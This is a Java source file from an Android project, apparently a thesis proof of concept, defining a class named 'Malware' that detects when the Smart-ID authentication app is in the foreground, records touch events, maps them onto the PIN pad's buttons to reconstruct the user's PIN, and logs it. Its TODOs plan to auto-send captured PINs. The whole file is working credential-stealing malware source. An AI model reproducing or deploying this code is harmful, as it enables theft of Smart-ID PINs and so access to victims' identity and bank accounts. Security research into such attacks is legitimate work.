package com.example.thesis;

import android.util.Log;

import com.example.thesis.Buttons.Button;
import com.example.thesis.Events.Event;
import com.example.thesis.Events.EventReader;

import java.util.Deque;
import java.util.List;

/**
 * This is the malware part of the app.
 */
public class Malware implements Runnable {
    // TODO: changes in smartidcheck into other threads and this one aswell
    // TODO: SEEM TO BE MISSING BACK BUTTON FOR REMOVING ON DIGIT OF PIN
    // TODO: add check for successful authentication and failure and PIN1, PIN2

    final private Converter converter;

    final private EventReader eventReader;
    private Thread eventReaderThread;

    final private SmartIDCheck smartIDCheck;

    private boolean doStop = false;
    private boolean eventReaderRunning = false;

    private boolean knowPins = false;  // TODO: If I know the PIN's then auto send them.
    // TODO: if failed login screen then knowPins to false again.

    public Malware(Converter converter) {
        this.converter = converter;

        this.smartIDCheck = new SmartIDCheck();

        this.eventReader = new EventReader();
    }


    public synchronized void doStop() {
        // TODO: destroy process and input/outpureaders.
        this.doStop = true;
        this.eventReader.doStop();
        this.smartIDCheck.doStop();
        Log.i("Malware", "Stopped malware!");
    }


    private synchronized boolean keepRunning() {
        return !this.doStop;
    }


    @Override
    public void run() {
        Log.i("Malware", "Started malware!");

        while (keepRunning()) {
            if (smartIDCheck.isSmartIDInForeground() && !eventReaderRunning) {
                eventReader.doStart();
                eventReaderThread = new Thread(eventReader);
                eventReaderThread.start();
                eventReaderRunning = true;
            } else if (!smartIDCheck.isSmartIDInForeground() && eventReaderRunning){
                eventReader.doStop();
                eventReaderRunning = false;

                // malware part, rename comment better.
                extractPIN();
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Log.i("Smart-ID Check", "Run loop interrupted!");
            }
        }
    }


    // TODO: rename fuction
    private void extractPIN() {
        StringBuilder PIN = new StringBuilder();

        if (smartIDCheck.successAuth()) {
            Deque<Event> touchEvents = eventReader.getTouchEvents();
            List<Button> buttons = smartIDCheck.getButtons();

            while (!touchEvents.isEmpty()) {
                Event touchEvent = touchEvents.poll();
                for (Button button : buttons) {
                    boolean isInside = button.touchInsideButton(touchEvent, converter);
                    if (isInside) {
                        if (button.getValue() == 1000) {
                            // OK button.
                        } else if (button.getValue() == -1000) {
                            // Cancel button.
                        } else {
                            // Numpad button.
                            PIN.append(button.getValue());
                        }
                    }
                }
            }
            Log.i("Malware", "Found PIN: " + PIN.toString());
        }
    }
}



